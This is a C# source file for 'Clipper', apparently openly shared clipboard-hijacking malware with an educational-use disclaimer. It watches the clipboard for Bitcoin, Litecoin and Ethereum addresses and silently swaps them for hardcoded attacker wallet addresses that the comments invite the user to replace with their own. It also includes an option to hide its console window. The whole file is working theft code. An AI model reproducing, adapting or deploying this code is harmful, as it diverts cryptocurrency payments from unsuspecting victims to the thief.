using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Threading;
using TextCopy;

/*
 * Copyright (c) 2026 vows
 * https://github.com/vowshq
 *
 * This source code is provided for educational and research purposes only.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY CLAIM, DAMAGES, OR
 * OTHER LIABILITY ARISING FROM THE USE OR MISUSE OF THIS SOFTWARE.
 *
 * By using, copying, or modifying this code, you agree that you are solely
 * responsible for your actions and for complying with all applicable laws
 * and the terms of service of any platform it interacts with.
 */

namespace Clipper
{

    internal class Program
    {

        [STAThread]


        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            string appName = "Clipper";
        restart:
            List<string> BTC = new() { "bc1" };
            List<string> LTC = new() { "ltc1" };
            List<string> ETH = new() { "0x" };
            string OurBTCAddress = "bc1q4zhv6n2ltkp8wm9xsd3jr7eac5fgy0qu8t2k6l"; //Change to your address
            string OurLTCAddress = "ltc1qlllllllllllllllllllllllllllllllld59lu2"; //Change to your address
            string OurETHAddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; //Change to your address

            string Detected = "";
            var clipboard = new Clipboard();
            IntPtr handle = GetConsoleWindow();

            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_SHOW); // put to SW_HIDE to keep the console hidden when ran
            }

            while (true) {

                try
                {
                    string? currentText = clipboard.GetText();

                    if (!string.IsNullOrEmpty(currentText) && currentText != Detected)
                    {
                        Colorful.Console.WriteLine("Sniffing");
                        Detected = currentText;


                        foreach (var word in BTC)
                        {

                            
                            if (currentText.Contains(word, StringComparison.OrdinalIgnoreCase))
                            {
                                if (currentText.Contains(OurBTCAddress))

                                {
                                    goto restart;
                                }


                                Colorful.Console.Write("[", Color.Purple);
                                Colorful.Console.Write("Address Type:", Color.Blue);
                                Colorful.Console.Write(" BTC", Color.Orange);
                                Colorful.Console.Write("] ", Color.Purple);
                                Colorful.Console.Write("[", Color.Purple);
                                Colorful.Console.Write("Detected", Color.Blue);
                                Colorful.Console.Write("]", Color.Purple);
                                Colorful.Console.WriteLine($" {currentText}", Color.GhostWhite);
                                CopyBTC();

                            }
                         
       
                        }

                        foreach (var word in LTC)
                        {
                            if (currentText.Contains(word, StringComparison.OrdinalIgnoreCase))
                            {
                                if (currentText.Contains(OurLTCAddress))

                                {
                                    goto restart;
                                }

                                Colorful.Console.Write("[", Color.Purple);
                                Colorful.Console.Write("Address Type:", Color.Blue);
                                Colorful.Console.Write(" LTC", Color.Orange);
                                Colorful.Console.Write("] ", Color.Purple);
                                Colorful.Console.Write("[", Color.Purple);
                                Colorful.Console.Write("Detected", Color.Blue);
                                Colorful.Console.Write("]", Color.Purple);
                                Colorful.Console.WriteLine($" {currentText}", Color.GhostWhite);
                                CopyLTC();
                            }
                        }

                        foreach (var word in ETH)
                        {
                            if (currentText.Contains(word, StringComparison.OrdinalIgnoreCase))
                            {   
                                if (currentText.Contains(OurETHAddress))
                                {
                                    goto restart;

                                }

                                Colorful.Console.Write("[", Color.Purple);
                                Colorful.Console.Write("Address Type:", Color.Blue);
                                Colorful.Console.Write(" ETH", Color.Orange);
                                Colorful.Console.Write("] ", Color.Purple);
                                Colorful.Console.Write("[", Color.Purple);
                                Colorful.Console.Write("Detected", Color.Blue);
                                Colorful.Console.Write("]", Color.Purple);
                                Colorful.Console.WriteLine($" {currentText}", Color.GhostWhite);
                                CopyETH();
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Colorful.Console.WriteLine("error");

                }
                static void CopyLTC()
                {
                    string Copy = "ltc1qlllllllllllllllllllllllllllllllld59lu2"; //Change to your address
                    ClipboardService.SetText(Copy);

                    Colorful.Console.Write("[", Color.Purple);
                    Colorful.Console.Write("Copied LTC", Color.Blue);
                    Colorful.Console.Write("]", Color.Purple);
                    Colorful.Console.WriteLine($" {Copy}", Color.GhostWhite);
                    Thread.Sleep(1000);
                }
                static void CopyETH()
                {
                    string Copy = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; //Change to your address
                    ClipboardService.SetText(Copy);

                    Colorful.Console.Write("[", Color.Purple);
                    Colorful.Console.Write("Copied LTC", Color.Blue);
                    Colorful.Console.Write("]", Color.Purple);
                    Colorful.Console.WriteLine($" {Copy}", Color.GhostWhite);
                    Thread.Sleep(1000);
                }
                static void CopyBTC()
                {
                    string Copy = "bc1q4zhv6n2ltkp8wm9xsd3jr7eac5fgy0qu8t2k6l"; //Change to your address
                    ClipboardService.SetText(Copy);

                    Colorful.Console.Write("[", Color.Purple);
                    Colorful.Console.Write("Copied BTC", Color.Blue);
                    Colorful.Console.Write("]", Color.Purple);
                    Colorful.Console.WriteLine($" {Copy}", Color.GhostWhite);
                    Thread.Sleep(1000);
                }
                
                goto restart;
                Colorful.Console.ReadLine();
            }
        }
    }
}
